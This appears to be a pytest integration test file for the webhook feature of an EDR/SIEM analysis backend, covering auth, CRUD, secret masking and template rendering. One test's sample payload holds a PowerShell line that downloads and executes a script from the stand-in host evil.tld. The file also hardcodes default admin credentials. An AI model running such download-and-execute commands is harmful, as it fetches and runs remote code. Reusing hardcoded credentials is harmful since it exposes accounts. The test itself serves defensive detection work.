"""Integration tests for the EDR/SIEM webhook subsystem.

Uses httpbin.org as a live echo target so we don't need to spin up a mock
server. Skips gracefully if network is unavailable.

Run:  pytest -xvs /app/backend/tests/test_webhooks.py
"""
from __future__ import annotations

import json
import os
import pytest
import httpx

BASE = os.environ.get("CYBERLAB_TEST_BASE", "http://localhost:8001")
ADMIN_EMAIL = os.environ.get("ADMIN_EMAIL", "admin@nivxmachines.com")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "NivX@Admin2025")

# Local httpbin-compatible target (httpbin.org can be rate-limited).
ECHO_URL = os.environ.get("WEBHOOK_TEST_ECHO", "https://httpbin.org/post")


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------
@pytest.fixture(scope="module")
def client():
    with httpx.Client(base_url=BASE, timeout=45.0) as c:
        yield c


@pytest.fixture(scope="module")
def admin_headers(client):
    r = client.post("/api/auth/login", json={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD})
    assert r.status_code == 200, f"login failed: {r.text}"
    return {"Authorization": f"Bearer {r.json()['access_token']}"}


@pytest.fixture
def created_webhook(client, admin_headers):
    """Create + auto-cleanup a webhook per test."""
    payload = {
        "name": "pytest echo",
        "target_type": "custom",
        "url": ECHO_URL,
        "method": "POST",
        "headers": {"Content-Type": "application/json", "X-Test": "yes"},
        "payload_template": (
            '{"verdict":"{{ verdict }}","risk":{{ risk_score }},'
            '"summary":{{ summary_json }},"iocs":{{ iocs_json }},'
            '"sigma":{{ sigma_rule_json }}}'
        ),
        "content_mode": "bundle_iocs",
        "enabled": True,
    }
    r = client.post("/api/webhooks", json=payload, headers=admin_headers)
    assert r.status_code == 201, r.text
    wh = r.json()
    yield wh
    # cleanup
    client.delete(f"/api/webhooks/{wh['id']}", headers=admin_headers)


# ---------------------------------------------------------------------------
# Auth
# ---------------------------------------------------------------------------
def test_unauth_endpoints_return_401(client):
    for path in ("/api/webhooks", "/api/webhooks/presets", "/api/webhooks/deliveries"):
        r = client.get(path)
        assert r.status_code == 401, f"{path} should require auth (got {r.status_code})"


def test_unauth_push_returns_401(client):
    r = client.post("/api/webhooks/push", json={"webhook_id": "x"})
    assert r.status_code == 401


# ---------------------------------------------------------------------------
# Presets
# ---------------------------------------------------------------------------
def test_presets_returns_all_targets(client, admin_headers):
    r = client.get("/api/webhooks/presets", headers=admin_headers)
    assert r.status_code == 200
    presets = r.json()
    ids = {p["id"] for p in presets}
    for expected in ("custom", "splunk_hec", "sentinel_logic_app",
                     "elastic_security", "crowdstrike_falcon",
                     "slack", "discord", "teams"):
        assert expected in ids, f"missing preset {expected}"
    # Every preset has the required schema
    for p in presets:
        assert "payload_template" in p and p["payload_template"].strip()
        assert "method" in p and p["method"] in ("POST", "PUT")
        assert "docs_url" in p


# ---------------------------------------------------------------------------
# CRUD
# ---------------------------------------------------------------------------
def test_create_list_update_delete(client, admin_headers):
    # CREATE
    payload = {
        "name": "crud-test",
        "target_type": "slack",
        "url": ECHO_URL,
        "method": "POST",
        "headers": {"Content-Type": "application/json", "Authorization": "Bearer secret-xyz"},
        "payload_template": '{"x":"{{ verdict }}"}',
        "content_mode": "bundle_iocs",
        "enabled": True,
    }
    r = client.post("/api/webhooks", json=payload, headers=admin_headers)
    assert r.status_code == 201, r.text
    wh = r.json()
    assert wh["name"] == "crud-test"
    # Secret header must be masked in the response
    assert wh["headers"]["Authorization"] == "***"
    # Non-secret header preserved
    assert wh["headers"]["Content-Type"] == "application/json"

    # LIST
    r = client.get("/api/webhooks", headers=admin_headers)
    assert r.status_code == 200
    ids = [w["id"] for w in r.json()]
    assert wh["id"] in ids

    # UPDATE — mask preservation: sending back *** must keep the real value
    r = client.patch(
        f"/api/webhooks/{wh['id']}",
        json={"name": "crud-renamed", "headers": {
            "Content-Type": "application/json",
            "Authorization": "***",  # unchanged
        }},
        headers=admin_headers,
    )
    assert r.status_code == 200, r.text
    assert r.json()["name"] == "crud-renamed"

    # DELETE
    r = client.delete(f"/api/webhooks/{wh['id']}", headers=admin_headers)
    assert r.status_code == 200
    r = client.delete(f"/api/webhooks/{wh['id']}", headers=admin_headers)
    assert r.status_code == 404


# ---------------------------------------------------------------------------
# Template rendering (unit-ish — exercised via the /test endpoint which
# actually POSTs to the echo URL and gets the rendered body back)
# ---------------------------------------------------------------------------
def test_test_push_dispatches_to_echo(client, admin_headers, created_webhook):
    r = client.post(f"/api/webhooks/{created_webhook['id']}/test", headers=admin_headers)
    assert r.status_code == 200, r.text
    d = r.json()
    # httpbin.org may 5xx under load — accept either outcome but still assert
    # the delivery record was persisted with attempt counting.
    assert d["status"] in ("ok", "failed")
    assert d["webhook_name"] == "pytest echo"
    assert d["attempts"] >= 1
    assert "content_summary" in d


def test_real_push_uses_analyst_payload(client, admin_headers, created_webhook):
    payload = {
        "webhook_id": created_webhook["id"],
        "input": "powershell -enc AAA=",
        "output": "IEX (New-Object Net.WebClient).DownloadString('http://evil.tld/a.ps1')",
        "summary": "Cobalt Strike stager via PS -enc",
        "verdict": "malicious",
        "risk_score": 82,
        "sigma_rule": "title: PS Enc Stager\ndetection: {}",
        "yara_rule": 'rule Stager { condition: true }',
        "iocs": [{"type": "domain", "value": "evil.tld"}, {"type": "ipv4", "value": "1.2.3.4"}],
        "mitre": [{"id": "T1059.001", "name": "PowerShell", "tactic": "Execution"}],
    }
    r = client.post("/api/webhooks/push", json=payload, headers=admin_headers)
    assert r.status_code == 200, r.text
    d = r.json()
    assert d["webhook_id"] == created_webhook["id"]
    assert "Sigma" in d["content_summary"]
    assert "verdict=malicious" in d["content_summary"]


def test_disabled_webhook_refuses_push(client, admin_headers, created_webhook):
    # Disable it
    r = client.patch(
        f"/api/webhooks/{created_webhook['id']}",
        json={"enabled": False},
        headers=admin_headers,
    )
    assert r.status_code == 200

    r = client.post(
        "/api/webhooks/push",
        json={"webhook_id": created_webhook["id"]},
        headers=admin_headers,
    )
    assert r.status_code == 400
    assert "disabled" in r.json()["detail"].lower()


def test_delivery_history_records_pushes(client, admin_headers, created_webhook):
    # Trigger a push, then fetch the audit log.
    client.post(f"/api/webhooks/{created_webhook['id']}/test", headers=admin_headers)
    r = client.get("/api/webhooks/deliveries", headers=admin_headers)
    assert r.status_code == 200
    log = r.json()
    matching = [d for d in log if d["webhook_id"] == created_webhook["id"]]
    assert len(matching) >= 1
    entry = matching[0]
    for k in ("id", "status", "attempts", "content_summary", "sent_at", "webhook_name"):
        assert k in entry


# ---------------------------------------------------------------------------
# Template rendering — unit test via `webhooks.delivery.render_template`
# ---------------------------------------------------------------------------
def test_render_template_substitutes_all_documented_vars():
    from webhooks import delivery
    tmpl = (
        '{"v":"{{ verdict|title }}","risk":{{ risk_score }},'
        '"sev":"{{ severity_word }}","s":{{ summary_json }},'
        '"sigma":{{ sigma_rule_json }},"ioc_n":"{{ ioc_count }}"}'
    )
    ctx = delivery.build_render_context(
        {
            "verdict": "malicious", "risk_score": 82, "summary": "x\ny",
            "sigma_rule": "title: T", "iocs": [{"a": 1}, {"b": 2}],
        },
        content_mode="bundle_iocs",
        sent_at="2026-01-01T00:00:00Z",
    )
    rendered = delivery.render_template(tmpl, ctx)
    # Must be valid JSON with variables substituted.
    parsed = json.loads(rendered)
    assert parsed["v"] == "Malicious"  # title filter
    assert parsed["risk"] == 82
    assert parsed["sev"] == "critical"  # 82 >= 80
    assert parsed["s"] == "x\ny"
    assert "title: T" in parsed["sigma"]
    assert parsed["ioc_n"] == "2"


def test_render_content_mode_strips_queries_in_bundle_iocs():
    from webhooks import delivery
    ctx = delivery.build_render_context(
        {"verdict": "clean", "risk_score": 5, "splunk_spl": "search *",
         "sentinel_kql": "SecurityEvent | count", "cisco_xdr": "hunt"},
        content_mode="bundle_iocs",
        sent_at="2026-01-01T00:00:00Z",
    )
    # bundle_iocs → queries stripped to ""
    assert ctx["splunk_spl_json"] == '""'
    assert ctx["sentinel_kql_json"] == '""'
    assert ctx["cisco_xdr_json"] == '""'


def test_render_content_mode_bundle_full_includes_queries():
    from webhooks import delivery
    ctx = delivery.build_render_context(
        {"verdict": "clean", "risk_score": 5, "splunk_spl": "search *"},
        content_mode="bundle_full",
        sent_at="2026-01-01T00:00:00Z",
    )
    assert "search *" in ctx["splunk_spl_json"]
